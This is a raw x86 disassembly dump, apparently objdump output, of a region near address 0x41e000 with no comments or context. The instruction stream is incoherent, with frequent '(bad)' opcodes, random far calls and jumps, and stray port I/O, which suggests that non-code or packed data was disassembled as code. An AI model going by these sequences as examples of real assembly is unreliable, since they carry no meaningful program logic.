  41d9e7:	add    DWORD PTR ds:[eax],eax
  41d9ea:	inc    DWORD PTR [eax]
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	addr16 dec ecx
  41d9f0:	daa    
  41d9f1:	call   0x2ea394cd
  41d9f6:	sub    al,BYTE PTR [edx-0x427934ec]
  41d9fc:	jp     0x41d9ba
  41d9fe:	or     al,0xc2
  41da00:	inc    ebx
  41da01:	aas    
  41da02:	cs jmp 0x297:0x4e1e7200
  41da0a:	add    BYTE PTR [ecx+0x55584fd7],ch
  41da10:	adc    ah,BYTE PTR [eax-0x45]
  41da13:	pop    ss
  41da14:	pusha  
  41da15:	cmc    
  41da16:	jo     0x41da5c
  41da18:	push   ds
  41da19:	or     eax,0xd6642cc7
  41da1e:	icebp  
  41da1f:	add    dl,BYTE PTR [esi+0x29b7c5cc]
  41da25:	data16 mov ch,0xed
  41da28:	dec    edx
  41da29:	mov    cl,0x52
  41da2b:	ins    BYTE PTR es:[edi],dx
  41da2c:	sub    BYTE PTR [ebx],bl
  41da2e:	jecxz  0x41d9f1
  41da30:	mov    ds:0x18cb067b,eax
  41da35:	repnz and ebx,ebp
  41da38:	jecxz  0x41daa5
  41da3a:	test   eax,0xfbb00985
  41da3f:	push   ecx
  41da40:	inc    eax
  41da41:	add    BYTE PTR [ebx+0x5e],cl
  41da44:	scas   eax,DWORD PTR es:[edi]
  41da45:	jp     0x41da23
  41da47:	inc    edi
  41da48:	jmp    0xb7478c9
  41da4d:	js     0x41da87
  41da4f:	pusha  
  41da50:	inc    esi
  41da51:	fld    DWORD PTR [ecx+0x661728e0]
  41da57:	xchg   al,cl
  41da59:	je     0x41d9ed
  41da5b:	inc    ebp
  41da5c:	xchg   DWORD PTR ds:0x8e6b3ef1,edx
  41da62:	pop    ebp
  41da63:	(bad)  
  41da64:	div    DWORD PTR [ebx+0x1ff1343f]
  41da6a:	mov    eax,0xb5901e63
  41da6f:	bound  ebx,QWORD PTR [edi]
  41da71:	rol    BYTE PTR [ecx-0x61],1
  41da74:	aad    0xe7
  41da76:	ins    DWORD PTR es:[edi],dx
  41da77:	inc    ecx
  41da78:	int3   
  41da79:	add    ch,BYTE PTR [ebx+0x1]
  41da7c:	in     al,dx
  41da7d:	push   ebx
  41da7e:	cmp    DWORD PTR [edi-0x7f3bba83],edx
  41da84:	popf   
  41da85:	mov    esi,0xe3e3516e
  41da8a:	arpl   WORD PTR [esi+0x2c],si
  41da8d:	pop    edi
  41da8e:	test   al,ah
  41da90:	loopne 0x41daac
  41da92:	xchg   esi,eax
  41da93:	(bad)  
  41da95:	test   BYTE PTR [esp+ebp*8-0x155a76a5],dh
  41da9c:	out    dx,eax
  41da9d:	stos   DWORD PTR es:[edi],eax
  41da9e:	and    dl,BYTE PTR ds:0xceda98fc
  41daa4:	fnstenv [ebx-0x52a7cbc4]
  41daaa:	add    al,0xd4
  41daac:	(bad)  
  41daad:	(bad)  
  41daaf:	jp     0x41daf5
  41dab1:	sbb    BYTE PTR [eax+0x5f424bfc],dl
  41dab7:	sbb    BYTE PTR [ebx],bh
  41dab9:	and    BYTE PTR [ebx-0x26],0x4b
  41dabd:	pop    ds
  41dabe:	add    eax,0xc717afa3
  41dac3:	sub    esp,DWORD PTR [edi]
  41dac5:	mov    esp,0xf461e8f8
  41daca:	call   0x8710:0x4ccbd2b2
  41dad1:	mov    cl,0xf9
  41dad3:	inc    ebx
  41dad4:	and    BYTE PTR [edi],0x8
  41dad7:	inc    ecx
  41dad8:	mov    ebx,0x3bcd20c9
  41dadd:	xchg   edx,eax
  41dade:	mov    ebx,0xa3873437
  41dae3:	ins    BYTE PTR es:[edi],dx
  41dae4:	test   BYTE PTR [esi-0x2e],dl
  41dae7:	retf   0xa774
  41daea:	and    BYTE PTR [eax+0x21],0x0
	...
  41db56:	sbb    al,0x15
  41db58:	jnp    0x41dbad
  41db5a:	jnp    0x41dbdb
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffffdd
  41db63:	call   0x1:0x3effe71e
  41db6a:	inc    DWORD PTR [eax]
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	cwde   
  41db6f:	add    eax,edx
  41db71:	shl    BYTE PTR [esi-0x3a],cl
  41db74:	push   ebx
  41db75:	jecxz  0x41db15
  41db77:	jmp    0x41dbb6
  41db79:	dec    eax
  41db7a:	jno    0x41db98
  41db7c:	int3   
  41db7d:	lock mov DWORD PTR [ecx],0x68af231b
  41db84:	xor    DWORD PTR [eax],eax
  41db86:	dec    eax
  41db87:	jl     0x41db87
  41db89:	jae    0x41dc09
  41db8b:	(bad)  
  41db8c:	add    edx,DWORD PTR gs:[edi-0x229f8777]
  41db93:	mov    edi,0xb438a065
  41db98:	retf   
  41db99:	xchg   edx,eax
  41db9a:	fcom   DWORD PTR cs:[esi*4+0x6d258b60]
  41dba2:	push   edi
  41dba3:	not    BYTE PTR [eax]
  41dba5:	sub    ebx,DWORD PTR [ebx-0x7ab91213]
  41dbab:	mov    cs,ecx
  41dbad:	loop   0x41db87
  41dbaf:	fisub  WORD PTR [esp+ebp*8]
  41dbb2:	leave  
  41dbb3:	mov    dl,0xe2
  41dbb5:	pop    eax
  41dbb6:	and    al,0xde
  41dbb8:	(bad)  
  41dbb9:	in     al,dx
  41dbba:	cmp    eax,0xba2f99ee
  41dbbf:	mov    cl,0x23
  41dbc1:	loopne 0x41db63
  41dbc3:	sub    ch,BYTE PTR [ebp+0x2f239924]
  41dbc9:	push   edx
  41dbca:	repnz xor al,0x2d
  41dbcd:	imul   ebx,DWORD PTR [ecx-0x6cf09810],0xffffffa7
  41dbd4:	ds popf 
  41dbd6:	inc    DWORD PTR [edx+edx*1-0x2c28fd83]
  41dbdd:	mov    ebx,DWORD PTR [ecx+eiz*8]
  41dbe0:	inc    edx
  41dbe1:	rcr    BYTE PTR [esi+ebx*8-0x46],cl
  41dbe5:	mov    edi,ebp
  41dbe7:	ret    
  41dbe8:	fistp  WORD PTR [eax]
  41dbea:	shl    BYTE PTR [eax+0x3e],0x8e
  41dbee:	mov    al,ds:0x492b83b7
  41dbf3:	fsubr  QWORD PTR [eax-0x26763693]
  41dbf9:	nop
  41dbfa:	cmp    ecx,DWORD PTR [esi]
  41dbfc:	push   ds
  41dbfd:	out    0xfc,eax
  41dbff:	aas    
  41dc00:	dec    edi
  41dc01:	mov    esi,0x48dd3389
  41dc06:	shl    DWORD PTR ss:[eax],0x5d
  41dc0a:	test   BYTE PTR [ecx+eiz*1-0xf],bh
  41dc0e:	mov    cl,0x6b
  41dc10:	(bad)  
  41dc11:	mov    DWORD PTR [eax+ebp*8],ecx
  41dc14:	mov    ch,0x10
  41dc16:	pusha  
  41dc17:	rcl    DWORD PTR [ebx-0x31],cl
  41dc1a:	fcom   QWORD PTR [eax]
  41dc1c:	sahf   
  41dc1d:	push   edx
  41dc1e:	enter  0x8b73,0xc6
  41dc22:	test   eax,0x60d8f993
  41dc27:	sub    eax,0x6e7d07fe
  41dc2c:	(bad)  [ecx]
  41dc2e:	inc    esp
  41dc2f:	(bad)  
  41dc30:	call   0x42d9:0x65a13912
  41dc37:	push   esp
  41dc38:	sub    bh,ah
  41dc3a:	les    eax,FWORD PTR [edx+0x61]
  41dc3d:	clc    
  41dc3e:	add    esi,ebx
  41dc40:	sbb    cl,ch
  41dc42:	jge    0x41dbcd
  41dc44:	cli    
  41dc45:	ins    DWORD PTR es:[edi],dx
  41dc46:	or     al,0xeb
  41dc48:	mov    al,0xea
  41dc4a:	inc    ecx
  41dc4b:	add    al,ch
  41dc4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc4e:	retf   
  41dc4f:	mov    cl,0x12
  41dc51:	sahf   
  41dc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc53:	aaa    
  41dc54:	or     DWORD PTR [edi-0x56],edi
  41dc57:	pop    ebx
  41dc58:	or     esp,DWORD PTR [ebp-0x57]
  41dc5b:	imul   esi,ebp,0xfffffffa
  41dc5e:	cmp    DWORD PTR [esi-0x64],edx
  41dc61:	push   esi
  41dc62:	add    eax,0xa0e50d5d
  41dc67:	cmp    bl,bl
  41dc69:	adc    eax,0x28154b
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi-0x2b4f2fb0]
  41dce3:	mov    esi,0x3ffeb610
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	inc    DWORD PTR [eax]
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	lahf   
  41dcef:	nop
  41dcf0:	lods   eax,DWORD PTR ds:[esi]
  41dcf1:	inc    ebx
  41dcf2:	mov    ecx,0xea445e3a
  41dcf7:	in     al,dx
  41dcf8:	or     al,0x95
  41dcfa:	mov    al,0x94
  41dcfc:	lods   al,BYTE PTR ds:[esi]
  41dcfd:	loope  0x41dd4a
  41dcff:	loope  0x41dccc
  41dd01:	xchg   BYTE PTR [esi+ebx*2-0x6c13af76],ch
  41dd08:	xor    eax,0x69849437
  41dd0d:	test   al,0xf8
  41dd0f:	xlat   BYTE PTR es:[ebx]
  41dd11:	jg     0x41dd0b
  41dd13:	cmp    eax,esi
  41dd15:	out    0xd,al
  41dd17:	or     bh,0xd2
  41dd1a:	adc    esp,DWORD PTR [edx-0x4c]
  41dd1d:	cmp    eax,0x21985393
  41dd22:	loopne 0x41dcc0
  41dd24:	push   ecx
  41dd25:	scas   eax,DWORD PTR es:[edi]
  41dd26:	add    DWORD PTR [esi+ebx*4+0x70],esp
  41dd2a:	jg     0x41dccf
  41dd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd2d:	adc    BYTE PTR [edx-0x51de5b93],al
  41dd33:	mov    dh,0xca
  41dd35:	and    al,0xdf
  41dd38:	inc    ebp
  41dd39:	xchg   ecx,eax
  41dd3a:	jnp    0x41dcf9
  41dd3c:	pop    ebx
  41dd3d:	add    bh,BYTE PTR [esi+0x17]
  41dd40:	dec    ebp
  41dd41:	mov    WORD PTR [eax+edi*8-0x30],fs
  41dd45:	test   ch,al
  41dd47:	cmp    eax,DWORD PTR [edi]
  41dd49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd4a:	jns    0x41dd9c
  41dd4c:	das    
  41dd4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd4e:	outs   dx,BYTE PTR ds:[esi]
  41dd4f:	ret    0xbf7d
  41dd52:	or     al,0xec
  41dd54:	int3   
  41dd55:	jmp    0x41dd96
  41dd57:	push   ebx
  41dd58:	lods   al,BYTE PTR ds:[esi]
  41dd59:	sbb    al,0xc7
  41dd5b:	addr16 jg 0x41dcdf
  41dd5e:	in     al,dx
  41dd5f:	iret   
  41dd60:	bound  esi,QWORD PTR [edx-0x7d62e892]
  41dd66:	pop    eax
  41dd67:	pop    ebp
  41dd68:	add    bh,bl
  41dd6a:	pop    esp
  41dd6b:	sbb    eax,0x52f79f9a
  41dd70:	sub    ch,BYTE PTR [esi+0x5f83dd8a]
  41dd76:	add    eax,0x9f1df95a
  41dd7b:	xor    al,0x54
  41dd7d:	test   al,0x6b
  41dd7f:	fstp   QWORD PTR [edx-0x10e28adf]
  41dd85:	(bad)  
  41dd87:	arpl   WORD PTR [edi-0x69c2bddb],si
  41dd8d:	icebp  
  41dd8e:	mov    cl,0xff
  41dd90:	sbb    BYTE PTR ds:0xe6091b0b,cl
  41dd96:	shr    BYTE PTR [eax+0x57],cl
  41dd99:	inc    esi
  41dd9a:	ret    
  41dd9b:	adc    al,0x4
  41dd9e:	iret   
  41dd9f:	push   ecx
  41dda0:	imul   esi,DWORD PTR [esi+0x344a9d1e],0xffffffe9
  41dda7:	jge    0x41ddc8
  41dda9:	pmovmskb ebx,mm7
  41ddac:	push   ecx
  41ddad:	shl    DWORD PTR [edx+0x7481a2fe],0xe9
  41ddb4:	dec    ebp
  41ddb5:	(bad)  
  41ddb6:	and    ah,BYTE PTR [esp+ebp*4-0xb9c3d0c]
  41ddbd:	je     0x41dd53
  41ddbf:	xchg   BYTE PTR [eax+eax*4+0x3e6f0d48],al
  41ddc6:	lea    esi,[edx-0x69d48dd0]
  41ddcc:	cs xchg edi,eax
  41ddce:	test   dl,bl
  41ddd0:	mov    esi,0xc077b5f3
  41ddd5:	sbb    DWORD PTR [esi-0x60],esp
  41ddd8:	dec    ebp
  41ddd9:	rcr    al,1
  41dddb:	int3   
  41dddc:	add    dh,BYTE PTR [eax+0x60]
  41dddf:	out    dx,al
  41dde0:	lods   al,BYTE PTR ds:[esi]
  41dde1:	repz push es
  41dde3:	xor    bl,dl
  41dde5:	adc    bl,BYTE PTR [eax-0x23a15302]
  41ddeb:	sti    
  41ddec:	pusha  
	...
  41de55:	add    BYTE PTR [eax],ah
  41de57:	repz das 
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	nop
  41de63:	into   
  41de64:	jns    0x41de33
  41de66:	std    
  41de67:	inc    eax
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	inc    DWORD PTR [eax]
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	test   eax,0x98953894
  41de73:	in     eax,dx
  41de74:	hlt    
  41de75:	(bad)  
  41de78:	ins    DWORD PTR es:[edi],dx
  41de79:	mov    cl,0x26
  41de7b:	ds inc edx
  41de7d:	mov    bh,0xbc
  41de7f:	dec    ecx
  41de80:	(bad)  
  41de81:	push   eax
  41de82:	mov    edx,0x2ebd4c03
  41de87:	jns    0x41de10
  41de89:	xchg   ebp,eax
  41de8a:	cmp    DWORD PTR [eax-0x356c1352],eax
  41de90:	icebp  
  41de91:	pop    ebp
  41de92:	call   0x5599805
  41de97:	cmp    BYTE PTR [ebp-0x27428158],al
  41de9d:	fldenv [esi]
  41de9f:	fist   DWORD PTR [eax-0x47]
  41dea2:	jb     0x41de91
  41dea4:	adc    eax,0xf61d7fab
  41dea9:	mov    eax,ds:0xaba39fca
  41deae:	sbb    cl,BYTE PTR [eax-0x4e7192b9]
  41deb4:	mov    dl,BYTE PTR [ecx+eax*1-0x29]
  41deb8:	std    
  41deb9:	iret   
  41deba:	mov    esp,0x88dab417
  41debf:	mov    cl,ah
  41dec1:	test   al,0x11
  41dec3:	dec    esi
  41dec4:	push   es
  41dec5:	xchg   ebx,eax
  41dec6:	mov    ecx,0xcebfd2d8
  41decb:	arpl   WORD PTR [ebx-0x38],di
  41dece:	xor    edi,DWORD PTR [esi+eiz*1+0x7470a165]
  41ded5:	sar    DWORD PTR [ecx+0x93233ae],0x44
  41dedc:	ret    0xd452
  41dedf:	xchg   edx,eax
  41dee0:	push   ds
  41dee1:	adc    DWORD PTR [ebx+0x431b7af8],ebp
  41dee7:	es push esp
  41dee9:	sub    DWORD PTR [ebx-0x58],eax
  41deec:	rol    DWORD PTR [edi-0x37],cl
  41deef:	test   WORD PTR [eax],bx
  41def2:	inc    ecx
  41def3:	in     al,dx
  41def4:	clc    
  41def5:	sub    ch,ah
  41def7:	pop    esi
  41def8:	mov    al,0x27
  41defb:	or     DWORD PTR ds:0x1ae9a35a,ebp
  41df01:	mov    ch,0x79
  41df03:	mov    esi,0xfb00353d
  41df08:	mov    gs,WORD PTR [ecx+0x8ad4c11]
  41df0e:	(bad)  
  41df0f:	lahf   
  41df10:	shl    BYTE PTR [esi-0x46],0x24
  41df14:	(bad)  
  41df15:	pushf  
  41df16:	jne    0x41df20
  41df18:	(bad)  
  41df19:	sti    
  41df1a:	add    al,0x83
  41df1c:	not    BYTE PTR [esp+ecx*8-0x4ac2fd91]
  41df23:	push   esp
  41df24:	and    al,0xbd
  41df26:	dec    esp
  41df27:	into   
  41df28:	cmp    dh,BYTE PTR [ebx]
  41df2a:	in     al,dx
  41df2b:	and    DWORD PTR [ecx],ebp
  41df2d:	call   0x4a8fcb5a
  41df32:	cmp    bh,BYTE PTR [ebx+0x14ce6045]
  41df38:	dec    edi
  41df39:	repnz pop edx
  41df3b:	adc    BYTE PTR [edi-0x3a2884b6],bl
  41df41:	data16 adc BYTE PTR [edi],dl
  41df44:	push   es
  41df45:	adc    esi,esp
  41df47:	out    dx,eax
  41df48:	out    dx,al
  41df49:	in     eax,0xa0
  41df4b:	mov    eax,ds:0xbacd090b
  41df50:	xor    DWORD PTR [ecx],ebx
  41df52:	cs or  eax,edi
  41df55:	xchg   bp,ax
  41df57:	popa   
  41df58:	outs   dx,BYTE PTR ds:[esi]
  41df59:	fnstcw WORD PTR [ecx+0x28939863]
  41df5f:	inc    ebx
  41df60:	fmul   DWORD PTR [ecx+0x59]
  41df63:	adc    ebx,DWORD PTR ds:0x51184fbb
  41df69:	arpl   ax,bx
  41df6b:	sub    dh,BYTE PTR [eax+0x0]
	...
  41dfd5:	add    BYTE PTR [edi],bh
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x9f7e9ce9
  41dfe4:	test   eax,0x141fc4e
  41dfe9:	add    bh,bh
  41dfeb:	add    BYTE PTR [eax],al
  41dfed:	add    ah,ch
  41dfef:	jne    0x41df99
  41dff1:	xor    BYTE PTR [edi+0x5],ah
  41dff4:	mov    BYTE PTR [edi],dl
  41dff6:	and    BYTE PTR [ecx],0x44
  41dff9:	inc    ebx
  41dffa:	icebp  
  41dffb:	dec    ebx
  41dffc:	cmp    ah,0x1f
  41dfff:	add    eax,0x8ff0eba3
  41e004:	jb     0x41e00a
  41e006:	in     eax,0xd0
  41e008:	pop    DWORD PTR [edi-0x65]
  41e00b:	lds    edi,FWORD PTR [edx-0x5adb6a07]
  41e011:	cdq    
  41e012:	in     al,dx
  41e013:	add    edx,ebx
  41e015:	fidivr WORD PTR [edx-0x9259ec3]
  41e01b:	cdq    
  41e01c:	test   BYTE PTR [esi],cl
  41e01e:	and    esp,DWORD PTR [edi+0x67d8bd54]
  41e024:	cmp    DWORD PTR [esi-0x59],esp
  41e027:	das    
  41e028:	and    al,0x8b
  41e02a:	aad    0xec
  41e02c:	sub    bl,BYTE PTR [eax-0x70]
  41e02f:	loope  0x41e068
  41e031:	fstp   st(7)
  41e033:	cld    
  41e034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e035:	cwde   
  41e036:	mov    esi,0xa5f8a08
  41e03b:	stos   BYTE PTR es:[edi],al
  41e03c:	push   0x26
  41e03e:	mov    ds:0xf7e92b87,al
  41e043:	loop   0x41dfcd
  41e045:	adc    bh,cl
  41e047:	cmp    al,0x7b
  41e049:	cwde   
  41e04a:	mov    edi,0x48fddda9
  41e04f:	sahf   
  41e050:	pop    eax
  41e051:	loope  0x41e08c
  41e053:	push   0x3b
  41e055:	xchg   esi,eax
  41e056:	mov    al,0xd4
  41e058:	arpl   WORD PTR [edi+0x7cac6a15],sp
  41e05e:	push   esi
  41e05f:	outs   dx,DWORD PTR ds:[esi]
  41e060:	lock and al,0xee
  41e063:	pusha  
  41e064:	inc    BYTE PTR [edx+0x276a7eba]
  41e06a:	cmp    BYTE PTR [esi+0x34d8d7f3],0xf
  41e071:	imul   ebp,DWORD PTR [ebp+0x57c470fe],0x36
  41e078:	pushf  
  41e079:	out    0x3c,al
  41e07b:	adc    eax,0xe13b62f0
  41e080:	pop    es
  41e081:	adc    al,0xbf
  41e083:	mov    BYTE PTR [ecx-0x69],0x97
  41e087:	es push edi
  41e089:	and    DWORD PTR ds:[edx-0x67],esi
  41e08d:	jmp    0x41e06a
  41e08f:	jnp    0x41e093
  41e091:	xchg   esp,eax
  41e092:	stc    
  41e093:	jle    0x41e0e8
  41e095:	jmp    0x41e095
  41e097:	hlt    
  41e098:	mov    eax,0x4888767b
  41e09d:	and    ebp,DWORD PTR [ebx+ecx*2-0x1]
  41e0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0a2:	and    eax,0xce3c015d
  41e0a7:	jae    0x41e049
  41e0a9:	outs   dx,BYTE PTR ds:[esi]
  41e0aa:	mov    DWORD PTR [ecx-0x75],esi
  41e0ad:	pop    ds
  41e0ae:	in     eax,0x7e
  41e0b0:	add    ch,dl
  41e0b2:	or     al,0xeb
  41e0b4:	mov    dh,0x54
  41e0b6:	mov    ecx,0x61d182b1
  41e0bb:	out    dx,eax
  41e0bc:	cmp    eax,0x948d2e28
  41e0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0c2:	mul    DWORD PTR [ebx+0x5117da88]
  41e0c8:	push   esi
  41e0c9:	aam    0x87
  41e0cb:	and    dl,BYTE PTR [ecx-0x31f52c57]
  41e0d1:	and    ecx,DWORD PTR [eax-0x38]
  41e0d4:	jb     0x41e0e7
  41e0d6:	and    eax,0x12e075ee
  41e0db:	in     eax,dx
  41e0dc:	adc    al,BYTE PTR [edi+0xd]
  41e0df:	sub    DWORD PTR ds:0xc08e1a17,esp
  41e0e5:	add    al,0x1d
  41e0e7:	mov    ebx,0x87355e79
  41e0ec:	adc    DWORD PTR [eax],eax
	...
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	jge    0x41e109
  41e164:	jae    0x41e1c9
  41e166:	sti    
  41e167:	inc    edx
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	inc    DWORD PTR [eax]
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	inc    ecx
  41e16f:	pop    ebx
  41e170:	iret   
  41e171:	pop    ebx
  41e172:	das    
  41e173:	push   cs
  41e174:	je     0x41e155
  41e176:	push   edi
  41e177:	pop    ss
  41e178:	retf   0xd5dc
  41e17b:	or     eax,0xd2703d02
  41e180:	out    0x3d,al
  41e182:	push   ebp
  41e183:	dec    ecx
  41e184:	cdq    
  41e185:	repnz inc esp
  41e187:	fisubr WORD PTR [edx-0x4c]
  41e18a:	sub    edx,DWORD PTR [ebx+0x6773a346]
  41e190:	les    ebx,FWORD PTR [ecx-0x4]
  41e193:	data16 test al,0xb4
  41e196:	lock pop esi
  41e198:	xor    ebx,DWORD PTR [edx+0x152495f8]
  41e19e:	pop    ebx
  41e19f:	call   0xffb27d6b
  41e1a4:	cmp    dl,dl
  41e1a6:	add    BYTE PTR [ecx+0x78],0x36
  41e1aa:	loopne 0x41e1c3
  41e1ac:	cs xchg ebp,eax
  41e1ae:	(bad)  
  41e1af:	mov    eax,DWORD PTR [edx]
  41e1b1:	ins    BYTE PTR es:[edi],dx
  41e1b2:	ja     0x41e173
  41e1b4:	popf   
  41e1b5:	inc    edx
  41e1b6:	pop    esp
  41e1b8:	out    dx,al
  41e1b9:	arpl   WORD PTR [edx+0x524db6bd],di
  41e1bf:	pop    ebx
  41e1c0:	and    dl,cl
  41e1c2:	aas    
  41e1c3:	loopne 0x41e201
  41e1c5:	pop    esi
  41e1c6:	jno    0x41e1cd
  41e1c8:	enter  0xe62c,0xf4
  41e1cc:	in     eax,dx
  41e1cd:	push   ss
  41e1ce:	(bad)  
  41e1d0:	jl     0x41e182
  41e1d2:	and    eax,0xbefaa3c2
  41e1d7:	xlat   BYTE PTR ds:[ebx]
  41e1d8:	cdq    
  41e1d9:	push   es
  41e1da:	loope  0x41e222
  41e1dc:	mov    ebp,DWORD PTR [edx+ecx*2+0x3b]
  41e1e0:	pop    esi
  41e1e1:	inc    esi
  41e1e2:	test   esi,edx
  41e1e4:	mov    ds:0x50ab937c,eax
  41e1e9:	daa    
  41e1ea:	ret    
  41e1eb:	into   
  41e1ec:	xor    BYTE PTR [edi],dl
  41e1ee:	or     DWORD PTR [ecx-0x33a65b37],edx
  41e1f4:	push   ecx
  41e1f5:	ins    DWORD PTR es:[edi],dx
  41e1f6:	add    BYTE PTR [edx-0x78e3c207],cl
  41e1fc:	mov    dh,0x79
  41e1fe:	fcmovnb st,st(0)
  41e200:	hlt    
  41e201:	leave  
  41e202:	sub    BYTE PTR [edi-0x2c],al
  41e205:	ja     0x41e1b4
  41e207:	arpl   WORD PTR [ecx-0x47d29841],cx
  41e20d:	int3   
  41e20e:	daa    
  41e20f:	dec    ecx
  41e210:	ins    BYTE PTR es:[edi],dx
  41e211:	aas    
  41e212:	mov    edx,0xe4ae79e6
  41e217:	cmc    
  41e218:	push   eax
  41e219:	inc    esp
  41e21a:	loopne 0x41e28b
  41e21c:	pop    eax
  41e21d:	push   edx
  41e21e:	stos   BYTE PTR es:[edi],al
  41e21f:	test   al,0x26
  41e221:	adc    eax,DWORD PTR [edx-0x2a]
  41e224:	inc    edi
  41e225:	imul   eax,DWORD PTR [ebx+0x4206df7c],0x3b
  41e22c:	in     al,dx
  41e22d:	xchg   esi,eax
  41e22e:	or     ah,BYTE PTR [ecx+0x25]
  41e231:	add    edi,DWORD PTR [ebp+0x26]
  41e234:	cmp    al,0x9
  41e236:	cmp    esi,esi
  41e238:	mov    ecx,0xb399858b
  41e23d:	ficom  DWORD PTR [ebx]
  41e23f:	mov    edi,DWORD PTR [ebp+edx*4+0x33b6561a]
  41e246:	addr16 das 
  41e248:	ss data16 gs or ah,cl
  41e24d:	cmp    DWORD PTR [eax-0x5c4ab6f0],edi
  41e253:	pop    ebp
  41e254:	jg     0x41e263
  41e256:	or     al,dh
  41e258:	push   ss
  41e259:	or     al,0x5a
  41e25b:	xchg   edx,eax
  41e25c:	add    ecx,DWORD PTR [esi+ebp*8-0x24]
  41e260:	ficomp DWORD PTR [ecx-0x23ac25cb]
  41e266:	push   eax
  41e267:	jecxz  0x41e2c0
  41e269:	mov    edi,edi
  41e26b:	push   ds
  41e26c:	inc    ebp
	...
  41e2d5:	add    BYTE PTR [ebx-0x1988fe],ch
  41e2db:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e2e1:	or     al,0x92
  41e2e3:	popa   
  41e2e4:	pop    ss
  41e2e5:	out    0xfa,eax
  41e2e7:	inc    ebx
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	inc    DWORD PTR [eax]
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	and    DWORD PTR [ecx],edi
  41e2f0:	fcomp  QWORD PTR [ebx]
  41e2f2:	outs   dx,BYTE PTR ds:[esi]
  41e2f3:	push   es
  41e2f4:	add    BYTE PTR [esi+0x29],bl
  41e2f7:	and    eax,ebp
  41e2f9:	outs   dx,BYTE PTR ds:[esi]
  41e2fa:	push   0x82eedc1f
  41e2ff:	push   ebx
  41e300:	in     al,0x5d
  41e302:	push   0xffffffde
  41e304:	loopne 0x41e364
  41e306:	ss ret 
  41e308:	retf   
  41e309:	and    eax,0xf1d250c5
  41e30e:	imul   edx,DWORD PTR [edi],0xdbc84f3a
  41e314:	inc    eax
  41e315:	std    
  41e316:	shl    DWORD PTR [ecx],cl
  41e318:	into   
  41e319:	jno    0x41e321
  41e31b:	mov    dh,0xb2
  41e31d:	mov    al,bl
  41e31f:	pop    esp
  41e320:	sar    BYTE PTR [ecx+edx*1-0x57],0x5d
  41e325:	jl     0x41e3a6
  41e327:	aas    
  41e328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e329:	ds pop es
  41e32b:	dec    esi
  41e32c:	mov    ah,0xc7
  41e32e:	outs   dx,DWORD PTR ds:[esi]
  41e32f:	mov    ch,0xac
  41e331:	push   ds
  41e332:	sahf   
  41e333:	or     al,0x11
  41e335:	stc    
  41e336:	pusha  
  41e337:	jmp    0x872f94d8
  41e33c:	out    dx,eax
  41e33d:	inc    esp
  41e33e:	cmp    edi,DWORD PTR [ecx+0x72]
  41e341:	cdq    
  41e342:	mov    ds,WORD PTR ds:[ebx+0x4c]
  41e346:	mov    bh,BYTE PTR [edx+0x3ddc1904]
  41e34c:	aas    
  41e34d:	scas   eax,DWORD PTR es:[edi]
  41e34e:	xchg   BYTE PTR [esi],ah
  41e350:	push   ecx
  41e351:	int3   
  41e352:	leave  
  41e353:	ins    DWORD PTR es:[edi],dx
  41e354:	leave  
  41e355:	aad    0x6d
  41e357:	adc    ah,BYTE PTR [ecx]
  41e359:	dec    edx
  41e35a:	pop    ebp
  41e35b:	jbe    0x41e3b8
  41e35d:	adc    eax,0x85db27a9
  41e362:	pushf  
  41e363:	pop    edx
  41e364:	js     0x41e313
  41e366:	pop    edi
  41e367:	sti    
  41e368:	inc    esi
  41e369:	popf   
  41e36a:	sub    bl,BYTE PTR [edx]
  41e36c:	(bad)  
  41e36d:	into   
  41e36e:	std    
  41e36f:	sub    ah,BYTE PTR [ebx]
  41e371:	into   
  41e372:	xchg   edi,eax
  41e373:	or     DWORD PTR [ecx+0x2b],0xedf831c2
  41e37a:	sub    al,0x14
  41e37c:	cmp    edi,ecx
  41e37e:	in     eax,dx
  41e37f:	jecxz  0x41e394
  41e381:	cmp    cl,BYTE PTR [ebx+0x1512734]
  41e387:	pushw  ss
  41e389:	pop    esp
  41e38a:	pop    ebx
  41e38b:	imul   ebp,DWORD PTR [edx-0x6703b1c8],0x3c336b16
  41e395:	jnp    0x41e3dc
  41e397:	inc    esi
  41e398:	inc    eax
  41e399:	test   eax,0x9e29b233
  41e39e:	xchg   DWORD PTR [esi],esi
  41e3a0:	into   
  41e3a1:	push   esp
  41e3a2:	add    dl,BYTE PTR [eax+0xbbf72d]
  41e3a8:	xor    ecx,DWORD PTR [esp+ebp*8]
  41e3ab:	mov    DWORD PTR [ebx-0x500812d1],esp
